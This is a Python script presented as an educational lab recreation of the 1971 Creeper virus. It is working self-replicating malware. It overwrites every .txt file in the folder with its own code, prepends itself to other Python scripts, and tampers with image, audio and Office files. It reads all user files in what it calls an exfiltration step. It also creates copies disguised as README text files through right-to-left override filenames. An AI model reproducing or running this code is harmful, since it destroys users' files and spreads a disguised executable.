#!/usr/bin/env python3
"""
Creeper (1971) - Educational self-replicating program
Bob Thomas / BBN - First virus concept
Laboratory version with user file interaction
"""
import os
import sys
import glob
import datetime
import zipfile
import io

RTL_OVERRIDE = "\u202E"
SELF_NAME = os.path.basename(__file__)
INFECTED_LOG = []
READ_LOG = []
LOG_LINES = []

def log(msg):
    LOG_LINES.append(f"[{datetime.datetime.now():%H:%M:%S}] {msg}")

def safe_print(msg):
    try:
        print(msg)
    except UnicodeEncodeError:
        safe = msg.encode('ascii', errors='replace').decode('ascii')
        print(safe)


# ── READ / EXFIL ──────────────────────────────────────

def read_file(path):
    try:
        with open(path, 'rb') as f:
            data = f.read()
        return data
    except Exception:
        return None

def exfiltrate(path):
    data = read_file(path)
    if data is None:
        return
    ext = os.path.splitext(path)[1].lower()
    name = os.path.basename(path)
    size = len(data)

    if ext == '.txt':
        lines = data.decode('utf-8', errors='replace').splitlines()
        print(f"[creep] reading: {name} (exfiltrated {size} bytes, {len(lines)} lines)")
        READ_LOG.append(name)
        log(f"Read {name}: {size}b, {len(lines)} lines")
    elif ext == '.csv':
        lines = data.decode('utf-8', errors='replace').splitlines()
        print(f"[creep] reading: {name} (parsed {len(lines)} rows)")
        READ_LOG.append(name)
        log(f"Read {name}: {len(lines)} rows")
    elif ext == '.html':
        lines = data.decode('utf-8', errors='replace').splitlines()
        tag_count = data.count(b'<')
        print(f"[creep] reading: {name} (found {tag_count} HTML tags)")
        READ_LOG.append(name)
        log(f"Read {name}: {tag_count} tags")
    elif ext == '.md':
        headers = sum(1 for l in data.decode('utf-8', errors='replace').splitlines() if l.startswith('#'))
        print(f"[creep] reading: {name} (found {headers} headers)")
        READ_LOG.append(name)
        log(f"Read {name}: {headers} headers")
    elif ext in ('.png', '.jpg', '.mp3'):
        print(f"[creep] reading: {name} ({size} bytes, binary)")
        READ_LOG.append(name)
        log(f"Read {name}: {size}b binary")
    elif ext in ('.docx', '.xlsx', '.pptx'):
        print(f"[creep] reading: {name} (office document, {size} bytes)")
        READ_LOG.append(name)
        log(f"Read {name}: {size}b office doc")
    elif ext == '.py':
        lines = data.decode('utf-8', errors='replace').splitlines()
        print(f"[creep] reading: {name} (script, {len(lines)} lines)")
        READ_LOG.append(name)
        log(f"Read {name}: {len(lines)} lines")


# ── INFECTION ─────────────────────────────────────────

def get_self_code():
    with open(__file__, 'r', encoding='utf-8') as f:
        return f.read()

def infect_file(path, code):
    name = os.path.basename(path)
    ext = os.path.splitext(path)[1].lower()

    if name.startswith('README') or RTL_OVERRIDE in name:
        return

    already = any(name in entry for entry in INFECTED_LOG)

    if ext == '.py':
        if name == SELF_NAME or name == 'setup_lab.py' or already:
            return
        with open(path, 'r', encoding='utf-8') as f:
            orig = f.read()
        infected = code + "\n# === INFECTED BY CREEPER ===\n" + orig
        with open(path, 'w', encoding='utf-8') as f:
            f.write(infected)
        INFECTED_LOG.append(f"{name} (prepended)")
        safe_print(f"[creep] infected: {name} (prepended virus code)"); log(f"Infected {name}: prepended")
    elif ext == '.txt':
        if already:
            return
        with open(path, 'w', encoding='utf-8') as f:
            f.write(code)
        INFECTED_LOG.append(f"{name} (overwritten)")
        safe_print(f"[creep] infected: {name} (overwritten with virus)"); log(f"Infected {name}: overwritten")


def infect_binary(path):
    """Append infection marker to PNG/JPG/MP3"""
    name = os.path.basename(path)
    ext = os.path.splitext(path)[1].lower()
    if name in (SELF_NAME, 'setup_lab.py') or RTL_OVERRIDE in name:
        return
    marker = b"\n[CREEPER-INFECTED]\nTimestamp: " + str(datetime.datetime.now()).encode() + b"\n"

    with open(path, 'rb') as f:
        data = f.read()

    if marker[:20] in data:
        return

    if ext == '.png' and data[-4:] == b'IEND':
        pos = data.rfind(b'IEND')
        pos += 12
        new = data[:pos] + marker + data[pos:]
        with open(path, 'wb') as f:
            f.write(new)
        size_added = len(new) - len(data)
        INFECTED_LOG.append(f"{name} (appended marker)")
        safe_print(f"[creep] infected: {name} (appended {size_added}b marker after IEND)")
        log(f"Infected {name}: appended {size_added}b to PNG")
    elif ext == '.jpg' and data[-2:] == b'\xff\xd9':
        new = data[:-2] + marker + b'\xff\xd9'
        with open(path, 'wb') as f:
            f.write(new)
        size_added = len(new) - len(data)
        INFECTED_LOG.append(f"{name} (appended marker)")
        safe_print(f"[creep] infected: {name} (appended {size_added}b marker before EOI)")
        log(f"Infected {name}: appended {size_added}b to JPG")
    elif ext == '.mp3':
        with open(path, 'ab') as f:
            f.write(marker)
        size_added = len(marker)
        INFECTED_LOG.append(f"{name} (appended marker)")
        safe_print(f"[creep] infected: {name} (appended {size_added}b marker)")
        log(f"Infected {name}: appended {size_added}b to MP3")


def infect_office(path):
    """Add hidden file inside DOCX/XLSX/PPTX ZIP archive"""
    name = os.path.basename(path)
    if name in (SELF_NAME, 'setup_lab.py') or RTL_OVERRIDE in name:
        return
    hidden_content = (
        f"CREEPER VIRUS - INFECTION MARKER\n"
        f"Timestamp: {datetime.datetime.now()}\n"
        f"Original file: {name}\n"
        f"This file was infected by the Creeper educational virus.\n"
    )

    try:
        with open(path, 'rb') as f:
            data = f.read()

        buf = io.BytesIO(data)
        if not zipfile.is_zipfile(buf):
            return
        buf.seek(0)

        z = zipfile.ZipFile(buf, 'a')
        hidden_path = f"creeper_infection/.creeper_marker.txt"
        try:
            z.getinfo(hidden_path)
            z.close()
            return
        except KeyError:
            pass

        z.writestr(hidden_path, hidden_content)
        z.close()

        with open(path, 'wb') as f:
            f.write(buf.getvalue())

        INFECTED_LOG.append(f"{name} (hidden entry)")
        safe_print(f"[creep] infected: {name} (added hidden marker inside ZIP)")
        log(f"Infected {name}: added hidden ZIP entry")
    except Exception:
        pass


def spawn_rtl_clones(code):
    for i in range(3):
        rtl_name = f"README{i}{RTL_OVERRIDE}txt.py"
        if not os.path.exists(rtl_name):
            with open(rtl_name, 'w', encoding='utf-8') as f:
                f.write(code)
            INFECTED_LOG.append(f"{rtl_name} (RTL clone)")
            safe_print(f"[creep] RTL-spawned: {repr(rtl_name)}")
            print(f"        (looks like README{i}.txt in Explorer)")
            log(f"RTL clone: README{i}.txt disguises as .py")


# ── MAIN ──────────────────────────────────────────────

def main():
    print("I'M THE CREEPER: CATCH ME IF YOU CAN.\n")

    code = get_self_code()
    all_files = sorted(glob.glob("*"))

    # 1. READ all user files (exfil simulation)
    targets_read = [f for f in all_files if os.path.isfile(f)
                    and f != SELF_NAME and f != 'setup_lab.py'
                    and not f.startswith('README')]
    for f in targets_read:
        exfiltrate(f)

    # 2. INFECT script.py and .txt files
    for f in all_files:
        if not os.path.isfile(f):
            continue
        ext = os.path.splitext(f)[1].lower()
        if ext in ('.py', '.txt'):
            infect_file(f, code)
        elif ext in ('.png', '.jpg', '.mp3'):
            if f != SELF_NAME and f != 'setup_lab.py':
                infect_binary(f)
        elif ext in ('.docx', '.xlsx', '.pptx'):
            if f != SELF_NAME and f != 'setup_lab.py':
                infect_office(f)

    # 3. RTL clones
    spawn_rtl_clones(code)

    # 4. Write log
    with open('infection.log', 'w', encoding='utf-8') as f:
        f.write("=== CREEPER VIRUS - INFECTION LOG ===\n")
        f.write(f"Execution: {datetime.datetime.now()}\n")
        f.write(f"Source: {SELF_NAME}\n\n")
        for line in LOG_LINES:
            f.write(line + "\n")
        f.write(f"\nFiles read: {len(READ_LOG)}\n")
        f.write(f"Files infected: {len(INFECTED_LOG)}\n")
        f.write("======================================\n")

    # 5. Report
    print(f"\n[creep] activity logged to: infection.log")
    print(f"[creep] files read:     {len(READ_LOG)}")
    print(f"[creep] files infected: {len(INFECTED_LOG)}")
    infected_count = sum(1 for e in INFECTED_LOG if 'RTL' not in e)
    rtl_count = sum(1 for e in INFECTED_LOG if 'RTL' in e)
    print(f"[creep]   - regular:  {infected_count}")
    print(f"[creep]   - RTL clones: {rtl_count}")
    print("[creep] use antivirus to remove me")

if __name__ == "__main__":
    main()
